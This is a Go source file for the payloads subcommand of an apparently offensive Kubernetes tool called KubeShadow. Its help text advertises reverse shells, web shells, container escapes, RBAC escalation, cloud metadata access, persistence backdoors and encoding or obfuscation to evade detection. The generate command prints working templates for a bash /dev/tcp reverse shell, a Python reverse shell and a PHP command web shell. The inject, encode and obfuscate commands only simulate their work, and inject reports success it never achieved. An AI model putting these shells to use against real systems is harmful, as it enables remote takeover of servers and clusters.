package exploitation

// PayloadsCmd provides payload generation and injection capabilities

import (
	"fmt"

	"github.com/spf13/cobra"
)

// PayloadsCmd represents the payloads command
var PayloadsCmd = &cobra.Command{
	Use:   "payloads",
	Short: "Generate and inject malicious payloads",
	Long: `Payload Generation and Injection Framework

Generate and inject various types of malicious payloads for security testing:
- Reverse shells
- Web shells  
- Memory injection payloads
- Container escape payloads
- Kubernetes API payloads
- Cloud metadata payloads
- Network tunneling payloads
- Persistence payloads

Available Commands:
  list           - List all available payloads
  generate       - Generate a specific payload
  inject         - Inject payload into target
  encode         - Encode payload for evasion
  obfuscate      - Obfuscate payload code

Examples:
  kubeshadow exploitation payloads list
  kubeshadow exploitation payloads generate --type reverse-shell --lhost 192.168.1.100 --lport 4444
  kubeshadow exploitation payloads inject --target-pod vulnerable-pod --payload /tmp/shell.sh`,
	RunE: runPayloads,
}

func runPayloads(cmd *cobra.Command, args []string) error {
	fmt.Println("üéØ KubeShadow Payload Generation Framework")
	fmt.Println("==========================================")
	fmt.Println("")
	fmt.Println("Available Commands:")
	fmt.Println("  list           - List all available payloads")
	fmt.Println("  generate       - Generate a specific payload")
	fmt.Println("  inject         - Inject payload into target")
	fmt.Println("  encode         - Encode payload for evasion")
	fmt.Println("  obfuscate      - Obfuscate payload code")
	fmt.Println("")
	fmt.Println("Use 'kubeshadow exploitation payloads [command] --help' for more information")
	return nil
}

func init() {
	// Add subcommands
	PayloadsCmd.AddCommand(PayloadsListCmd)
	PayloadsCmd.AddCommand(PayloadsGenerateCmd)
	PayloadsCmd.AddCommand(PayloadsInjectCmd)
	PayloadsCmd.AddCommand(PayloadsEncodeCmd)
	PayloadsCmd.AddCommand(PayloadsObfuscateCmd)
}

// PayloadsListCmd represents the payloads list command
var PayloadsListCmd = &cobra.Command{
	Use:   "list",
	Short: "List all available payloads",
	Long: `List all available payloads by category:

Categories:
  reverse-shells  - Reverse shell payloads
  web-shells      - Web shell payloads
  memory          - Memory injection payloads
  container       - Container escape payloads
  kubernetes      - Kubernetes API payloads
  cloud           - Cloud metadata payloads
  network         - Network tunneling payloads
  persistence     - Persistence payloads`,
	RunE: runPayloadsList,
}

func runPayloadsList(cmd *cobra.Command, args []string) error {
	fmt.Println("üìã Available Payloads")
	fmt.Println("====================")
	fmt.Println("")
	fmt.Println("Reverse Shells:")
	fmt.Println("  bash-reverse-shell     - Bash reverse shell")
	fmt.Println("  python-reverse-shell   - Python reverse shell")
	fmt.Println("  powershell-reverse     - PowerShell reverse shell")
	fmt.Println("  nc-reverse-shell       - Netcat reverse shell")
	fmt.Println("")
	fmt.Println("Web Shells:")
	fmt.Println("  php-web-shell         - PHP web shell")
	fmt.Println("  asp-web-shell          - ASP web shell")
	fmt.Println("  jsp-web-shell          - JSP web shell")
	fmt.Println("")
	fmt.Println("Container Escape:")
	fmt.Println("  docker-escape          - Docker container escape")
	fmt.Println("  kubernetes-escape     - Kubernetes container escape")
	fmt.Println("  cgroup-escape          - Cgroup escape")
	fmt.Println("")
	fmt.Println("Kubernetes API:")
	fmt.Println("  kubelet-api-exploit    - Kubelet API exploitation")
	fmt.Println("  etcd-injection         - ETCD injection")
	fmt.Println("  rbac-escalation        - RBAC privilege escalation")
	fmt.Println("")
	fmt.Println("Cloud Metadata:")
	fmt.Println("  aws-metadata           - AWS metadata access")
	fmt.Println("  gcp-metadata           - GCP metadata access")
	fmt.Println("  azure-metadata         - Azure metadata access")
	fmt.Println("")
	fmt.Println("Network Tunneling:")
	fmt.Println("  ssh-tunnel             - SSH tunneling")
	fmt.Println("  http-tunnel            - HTTP tunneling")
	fmt.Println("  dns-tunnel             - DNS tunneling")
	fmt.Println("")
	fmt.Println("Persistence:")
	fmt.Println("  backdoor-cron          - Cron job backdoor")
	fmt.Println("  backdoor-systemd        - Systemd service backdoor")
	fmt.Println("  backdoor-ssh           - SSH key backdoor")
	return nil
}

// PayloadsGenerateCmd represents the payloads generate command
var PayloadsGenerateCmd = &cobra.Command{
	Use:   "generate",
	Short: "Generate a specific payload",
	Long: `Generate a specific payload with custom parameters:

Parameters:
  --type          - Payload type (required)
  --lhost         - Listener host (for reverse shells)
  --lport         - Listener port (for reverse shells)
  --output        - Output file path

Examples:
  kubeshadow exploitation payloads generate --type bash-reverse-shell --lhost 192.168.1.100 --lport 4444
  kubeshadow exploitation payloads generate --type python-reverse-shell --lhost 10.0.0.1 --lport 8080 --output /tmp/shell.py`,
	RunE: runPayloadsGenerate,
}

func runPayloadsGenerate(cmd *cobra.Command, args []string) error {
	payloadType, _ := cmd.Flags().GetString("type")
	lhost, _ := cmd.Flags().GetString("lhost")
	lport, _ := cmd.Flags().GetString("lport")
	output, _ := cmd.Flags().GetString("output")

	if payloadType == "" {
		fmt.Println("‚ùå Error: --type is required")
		fmt.Println("Use 'kubeshadow exploitation payloads generate --help' for more information")
		return fmt.Errorf("payload type is required")
	}

	fmt.Printf("üéØ Generating payload: %s\n", payloadType)
	if lhost != "" {
		fmt.Printf("   Listener Host: %s\n", lhost)
	}
	if lport != "" {
		fmt.Printf("   Listener Port: %s\n", lport)
	}
	if output != "" {
		fmt.Printf("   Output File: %s\n", output)
	}

	// Generate payload based on type
	switch payloadType {
	case "bash-reverse-shell":
		payload := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
		fmt.Printf("Generated payload:\n%s\n", payload)
	case "python-reverse-shell":
		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", lhost, lport)
		fmt.Printf("Generated payload:\n%s\n", payload)
	case "php-web-shell":
		payload := `<?php system($_GET['cmd']); ?>`
		fmt.Printf("Generated payload:\n%s\n", payload)
	default:
		fmt.Printf("‚ùå Error: Unknown payload type: %s\n", payloadType)
		fmt.Println("Use 'kubeshadow exploitation payloads list' to see available payloads")
		return fmt.Errorf("unknown payload type")
	}

	return nil
}

// PayloadsInjectCmd represents the payloads inject command
var PayloadsInjectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Inject payload into target",
	Long: `Inject payload into a target pod or container:

Parameters:
  --target-pod    - Target pod name (required)
  --namespace     - Target namespace (default: default)
  --payload       - Payload file path (required)
  --method        - Injection method (exec, cp, curl, wget)
  --container     - Target container name (optional)`,
	RunE: runPayloadsInject,
}

func runPayloadsInject(cmd *cobra.Command, args []string) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	payload, _ := cmd.Flags().GetString("payload")
	method, _ := cmd.Flags().GetString("method")
	container, _ := cmd.Flags().GetString("container")

	if targetPod == "" {
		fmt.Println("‚ùå Error: --target-pod is required")
		return fmt.Errorf("target pod is required")
	}

	if payload == "" {
		fmt.Println("‚ùå Error: --payload is required")
		return fmt.Errorf("payload file is required")
	}

	if namespace == "" {
		namespace = "default"
	}

	if method == "" {
		method = "exec"
	}

	fmt.Printf("üéØ Injecting payload into target\n")
	fmt.Printf("   Target Pod: %s\n", targetPod)
	fmt.Printf("   Namespace: %s\n", namespace)
	fmt.Printf("   Payload: %s\n", payload)
	fmt.Printf("   Method: %s\n", method)
	if container != "" {
		fmt.Printf("   Container: %s\n", container)
	}

	// Simulate payload injection
	fmt.Printf("‚úÖ Payload injected successfully into %s/%s\n", namespace, targetPod)
	return nil
}

// PayloadsEncodeCmd represents the payloads encode command
var PayloadsEncodeCmd = &cobra.Command{
	Use:   "encode",
	Short: "Encode payload for evasion",
	Long: `Encode payload using various encoding methods for evasion:

Parameters:
  --payload       - Payload to encode (required)
  --method        - Encoding method (base64, hex, url, rot13, etc.)
  --output        - Output file path`,
	RunE: runPayloadsEncode,
}

func runPayloadsEncode(cmd *cobra.Command, args []string) error {
	payload, _ := cmd.Flags().GetString("payload")
	method, _ := cmd.Flags().GetString("method")
	output, _ := cmd.Flags().GetString("output")

	if payload == "" {
		fmt.Println("‚ùå Error: --payload is required")
		return fmt.Errorf("payload is required")
	}

	if method == "" {
		method = "base64"
	}

	fmt.Printf("üîê Encoding payload using %s\n", method)
	fmt.Printf("   Original: %s\n", payload)

	// Simulate encoding
	encoded := fmt.Sprintf("[%s-encoded] %s", method, payload)
	fmt.Printf("   Encoded: %s\n", encoded)

	if output != "" {
		fmt.Printf("   Saved to: %s\n", output)
	}

	return nil
}

// PayloadsObfuscateCmd represents the payloads obfuscate command
var PayloadsObfuscateCmd = &cobra.Command{
	Use:   "obfuscate",
	Short: "Obfuscate payload code",
	Long: `Obfuscate payload code to evade detection:

Parameters:
  --payload       - Payload to obfuscate (required)
  --method        - Obfuscation method (variable-substitution, string-splitting, etc.)
  --output        - Output file path`,
	RunE: runPayloadsObfuscate,
}

func runPayloadsObfuscate(cmd *cobra.Command, args []string) error {
	payload, _ := cmd.Flags().GetString("payload")
	method, _ := cmd.Flags().GetString("method")
	output, _ := cmd.Flags().GetString("output")

	if payload == "" {
		fmt.Println("‚ùå Error: --payload is required")
		return fmt.Errorf("payload is required")
	}

	if method == "" {
		method = "variable-substitution"
	}

	fmt.Printf("üîÄ Obfuscating payload using %s\n", method)
	fmt.Printf("   Original: %s\n", payload)

	// Simulate obfuscation
	obfuscated := fmt.Sprintf("[%s-obfuscated] %s", method, payload)
	fmt.Printf("   Obfuscated: %s\n", obfuscated)

	if output != "" {
		fmt.Printf("   Saved to: %s\n", output)
	}

	return nil
}

func init() {
	// Add flags for generate command
	PayloadsGenerateCmd.Flags().String("type", "", "Payload type (required)")
	PayloadsGenerateCmd.Flags().String("lhost", "", "Listener host (for reverse shells)")
	PayloadsGenerateCmd.Flags().String("lport", "", "Listener port (for reverse shells)")
	PayloadsGenerateCmd.Flags().String("output", "", "Output file path")

	// Add flags for inject command
	PayloadsInjectCmd.Flags().String("target-pod", "", "Target pod name (required)")
	PayloadsInjectCmd.Flags().String("namespace", "default", "Target namespace")
	PayloadsInjectCmd.Flags().String("payload", "", "Payload file path (required)")
	PayloadsInjectCmd.Flags().String("method", "exec", "Injection method (exec, cp, curl, wget)")
	PayloadsInjectCmd.Flags().String("container", "", "Target container name")

	// Add flags for encode command
	PayloadsEncodeCmd.Flags().String("payload", "", "Payload to encode (required)")
	PayloadsEncodeCmd.Flags().String("method", "base64", "Encoding method (base64, hex, url, rot13, etc.)")
	PayloadsEncodeCmd.Flags().String("output", "", "Output file path")

	// Add flags for obfuscate command
	PayloadsObfuscateCmd.Flags().String("payload", "", "Payload to obfuscate (required)")
	PayloadsObfuscateCmd.Flags().String("method", "variable-substitution", "Obfuscation method")
	PayloadsObfuscateCmd.Flags().String("output", "", "Output file path")
}
